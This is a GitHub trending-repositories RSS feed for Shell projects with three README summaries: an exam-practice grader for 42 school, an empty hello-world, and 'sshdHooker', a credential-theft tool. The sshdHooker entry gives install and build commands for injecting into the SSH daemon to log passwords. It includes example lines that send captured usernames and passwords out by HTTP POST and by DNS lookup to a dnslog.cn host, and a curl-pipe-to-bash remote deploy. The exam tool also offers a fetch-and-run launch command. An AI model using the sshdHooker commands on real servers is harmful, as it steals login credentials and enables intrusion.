<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Shell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-01-13T01:45:58Z</updated>
  <subtitle>Daily Trending of Shell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>JCluzet/42_EXAM</title>
    <updated>2023-01-13T01:45:58Z</updated>
    <id>tag:github.com,2023-01-13:/JCluzet/42_EXAM</id>
    <link href="https://github.com/JCluzet/42_EXAM" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A program almost identical to the 42 EXAMS for practice. (Pool EXAM &amp; Stud EXAM)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;42_EXAM v2 🎓&lt;/h1&gt; &#xA;&lt;h2&gt;All 42 exams auto-correct, to practice.&lt;/h2&gt; &#xA;&lt;h2&gt;ExamRank02, 03, 04, 05, 06 &amp;amp; PiscineExam&lt;/h2&gt; &#xA;&lt;h2&gt;👉 42_EXAM is now part of &lt;strong&gt;&lt;a href=&#34;https://grademe.fr&#34;&gt;GRADEME.FR&lt;/a&gt;&lt;/strong&gt; 😎&lt;/h2&gt; &#xA;&lt;h4&gt;Disclaimer: This project is not made by 42, it is not identical to the proposed exams and does not reflect your exams at 42&lt;/h4&gt; &#xA;&lt;h3&gt;NEW ExamRank02 available 🥳&lt;/h3&gt; &#xA;&lt;img width=&#34;711&#34; alt=&#34;Screenshot 2022-09-06 at 17 00 20&#34; src=&#34;https://user-images.githubusercontent.com/55356071/188669215-6681228d-e6b5-4229-b177-45d2699e29ae.png&#34;&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;⚠️ This project is available on MAC and LINUX (the real exam will be on Linux)&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Practice for the 42 exam 🏊‍♂️&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; New Subjects ExamRank02 APRIL 2022&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Subject drawn at random&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Exponential waiting for a correction&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; X Hours maximum&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Automatic correction (without internet)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Traceback available&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Detect infinite loop in your program (ExamRank02)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Detect infinite loop in all ExamRank&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Detect leaks in all exercices&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img width=&#34;711&#34; alt=&#34;Screenshot 2022-09-06 at 17 00 47&#34; src=&#34;https://user-images.githubusercontent.com/55356071/188669367-504411a5-5c62-4848-932e-405c9ee05a45.png&#34;&gt; &#xA;&lt;img width=&#34;711&#34; alt=&#34;Screenshot 2022-09-06 at 17 01 15&#34; src=&#34;https://user-images.githubusercontent.com/55356071/188669418-04f8bb1b-9cc2-4c07-9d07-5e9c570283b4.png&#34;&gt; &#xA;&lt;h1&gt;👓 CHEAT code :&lt;/h1&gt; &#xA;&lt;p&gt;(sorry don&#39;t work in exam at 42)&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;remove_grade_time&lt;/strong&gt; : remove grade time between two push&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  &amp;gt; The maximum time to complete the exam is only information. Here, the exercise can always be corrected even after the time limit.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;force_success&lt;/strong&gt; : force an exercice to success&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;new_ex&lt;/strong&gt; : generate a new exercice on the same level&lt;/p&gt; &#xA;&lt;h1&gt;🕶 VIP CHEAT code :&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/sponsors/JCluzet&#34;&gt;sponsor to become VIP&lt;/a&gt; OR &lt;a href=&#34;https://raw.githubusercontent.com/JCluzet/42_EXAM/main/CONTRIBUTING.md&#34;&gt;Contribute to become VIP&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can contribute by adding new exercices or improve the program&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;gradenow&lt;/strong&gt; : Get an instant correction (no waiting)&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Being a sponsor brings VIP on GradeMe and 42_EXAM.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;VIPs also have exactly the same display as the 42 examshell.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;More features coming&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;Launch in ONE COMMAND :&lt;/h1&gt; &#xA;&lt;p&gt;&lt;code&gt;bash -c &#34;$(curl https://grademe.fr)&#34;&lt;/code&gt; --&amp;gt; Visit &lt;a href=&#34;https://grademe.fr&#34;&gt;Grademe.fr&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;👮‍♀️ RGPD Information :&lt;/h1&gt; &#xA;&lt;p&gt;Some data may be collected for the sole purpose of improving the service, for example to check if an error is coming from the student and not from the program. The data that can be collected are :&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;the host name of your machine.&lt;/li&gt; &#xA; &lt;li&gt;the exam number you choose.&lt;/li&gt; &#xA; &lt;li&gt;name of exercice, fail or success, current assignement and level.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Contribution by adding more exercices :&lt;/h1&gt; &#xA;&lt;p&gt;You can contribute by adding new exercises very easily with 42_EXAM.&lt;/p&gt; &#xA;&lt;p&gt;📄 Read this documentation: &lt;a href=&#34;https://raw.githubusercontent.com/JCluzet/42_EXAM/main/CONTRIBUTING.md&#34;&gt;Contribution DOC&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;🥳 If your contribution is accepted, your name will be listed in the ReadMe as a contributor, thanks!&lt;/p&gt; &#xA;&lt;p&gt;Contributor : pandaero&lt;/p&gt; &#xA;&lt;h1&gt;Disclaimer for 42 staff :&lt;/h1&gt; &#xA;&lt;p&gt;This project is not identical to the proposed exams and does not reflect 42 official exam. It is only meant to help 42 students to train on some exercises found on Github. It works simply by doing a DIFF on both versions. All the subjects have been found on Github. During my schooling at 42, this project helped me to understand a lot of notions like to host a website, to do javascript, php and others. This project has been created with the sole purpose of helping students to understand their mistakes and improve themselves. If it’s not the case, I am ready to make changes and corrections on it, 42_EXAM/GradeMe has only a non-lucrative and educational purpose. It is completely free and open-source.&lt;/p&gt; &#xA;&lt;h1&gt;Your help is welcome&lt;/h1&gt; &#xA;&lt;p&gt;👋 If you have any problem with the test, it would be nice to create an &#34;Issue&#34;, it will take 3 minutes of your time and it will help me to make the test accessible to more people.&lt;/p&gt; &#xA;&lt;p&gt;📌 Remember that if you encounter an error, you are probably not the only one and your &#34;Issue&#34; will surely help other people.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>9bie/sshdHooker</title>
    <updated>2023-01-13T01:45:58Z</updated>
    <id>tag:github.com,2023-01-13:/9bie/sshdHooker</id>
    <link href="https://github.com/9bie/sshdHooker" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一键注入SSHD进程记录并发送ssh登录的密码&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;what&#39;s this?&lt;/h1&gt; &#xA;&lt;p&gt;注入SSHD之后就能记录下密码或者做其他操作。&lt;/p&gt; &#xA;&lt;p&gt;需要关闭selinux&lt;/p&gt; &#xA;&lt;h1&gt;how to use&lt;/h1&gt; &#xA;&lt;h2&gt;auto installer&lt;/h2&gt; &#xA;&lt;p&gt;密码记录器一键安装，仅暂时支持x64&lt;/p&gt; &#xA;&lt;p&gt;直接执行命令&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bash install.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;直接运行后ssh密码登录，记录地址为/tmp/.password.txt，默认so地址为/tmp/hello.so，默认注入器名字为/tmp/.i&lt;/p&gt; &#xA;&lt;p&gt;其他参数：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;    -e   修改so文件的路径，默认/tmp/hello.so&#xA;    -o   修改注入器的路径，默认/tmp/.i.&#xA;    -m   修改mode默认值为0，输出到文件，默认记录地址为/tmp/.password.txt ，如果值为1，则会改为命令行模式&#xA;    -p   修改payload，默认值为/tmp/.password.txt，如果mode值为1，则会使用snsprintf来格式化命令并且输出，请确保字符串中包含两个%s，用于格式化用户名和密码&#xA;    -d   自动删除，设置为anyone则抓到密码后立刻删除，否则则抓取到设置的指定用户名后删除&#xA;    -l   指定libc路径，默认寻址是寻找libc-xxxx.so和libc.so.x的方案，但是不排除会有其他奇奇怪怪的libc名称，所以添加了手动指定功能，详情可以查看/proc/pid/maps里找到libc名字&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;例子&lt;/h2&gt; &#xA;&lt;p&gt;https发送密码&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bash install.sh -p &#34;curl -X POST -d &#39;username=%s\&amp;amp;password=%s&#39; http://127.0.0.1&#34; -m 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;dns发送密码并且自动删除&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bash install.sh -p &#39;ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1&#39; -m 1 -d anyone&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;远程快速自动部署并自动删除&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.1/sshdHooker.sh | bash -s -- -d anyone&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;debug&lt;/h2&gt; &#xA;&lt;p&gt;执行&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99&#xA;&#xA;mv test2.so /tmp/hello.so&#xA;&#xA;gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread&#xA;&#xA;sudo ./inject sshd_pid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;然后等待用户连接SSH并且登录成功，密码保存于/tmp/.password.txt&lt;/p&gt; &#xA;&lt;h1&gt;todo&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;增加x86/arm支持&lt;/li&gt; &#xA; &lt;li&gt;bypass SELINUX&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Spring23-EE595/helloworld</title>
    <updated>2023-01-13T01:45:58Z</updated>
    <id>tag:github.com,2023-01-13:/Spring23-EE595/helloworld</id>
    <link href="https://github.com/Spring23-EE595/helloworld" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Hello World&lt;/h1&gt; &#xA;&lt;p&gt;Test demo for github.&lt;/p&gt;</summary>
  </entry>
</feed>